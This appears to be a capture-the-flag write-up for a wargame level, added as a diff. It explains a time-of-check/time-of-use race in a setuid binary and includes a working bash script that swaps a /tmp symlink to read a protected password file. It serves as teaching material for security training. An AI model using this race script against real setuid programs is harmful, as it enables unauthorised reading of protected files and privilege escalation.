@@ -1,0 +1,58 @@
+Quick level... spent too long trying to implement a filesystem maze but really it was unnecessary.
+
+the premise is that /maze/maze0 is:
+┌─────────────────────────────────────────────────────────────┐
+│ char buf[20];                                               │
+│ if(access("/tmp/128ecf542a35ac5270a87dc740918404")){        │
+│     setresuid(geteuid(), geteuid(), geteuid());             │
+│     FD *fd;                                                 │
+│     if( fd = open("/tmp/128ecf542a35ac5270a87dc740918404")){│
+│         read(fd, buf, 19);                                  │
+│         write(STDOUT, buf, 19);                             │
+│     }                                                       │
+│ }                                                           │
+│ exit(-1);                                                   │
+└─────────────────────────────────────────────────────────────┘ 
+
+It attempts to access the file '/tmp/128ecf...', and 
+if access succeeds, it opens and reads it's contents to stdout!
+
+This makes this level a very classic (and simple) example of a TOCTOU race...
+(From now on I'll refer to the /tmp/128... file as 'target')
+Make 'target' a symbolic link to a public file and execute maze0...
+when access succeeds, link 'target' to the actual file we want to read, /etc/maze_pass/maze1!
+Since access 'succeeds' and our permissions are elevated to those of maze1 before open(), we can read that file.
+
+The only difficult part is timing the access and open in a way that
+the public file is used for access(), and maze1pass is used for open().
+
+The easiest way to do that in this case, is to bruteforce level using shell scripts..
+
+		  xpl.sh
+┌───────────────────────────────────────────────┐
+│#!/bin/bash                                    │
+│TARGET="/tmp/128ecf542a35ac5270a87dc740918404" │
+│MAZEPASS="/etc/maze_pass/maze1"                │
+│while true; do                                 │
+│    rm "$TARGET"                               │
+│    ln -s /tmp/tald0/public $TARGET            │
+│    /maze/maze0 & ln -sf $MAZEPASS $TARGET     │
+│done                                           │
+└───────────────────────────────────────────────┘ 
+
+Run this script ^ in a loop to ensure errors and crashes don't get in the way, and eventually the password is dumped!
+
+shell:
+┌───────────────────────────────────────────────────────────┐
+│ $ touch public; while true; do ./xpl.sh 2> /dev/null done │
+│ $ **********                                              │
+└───────────────────────────────────────────────────────────┘ 
+
+
+
+
+
+
+
+
+
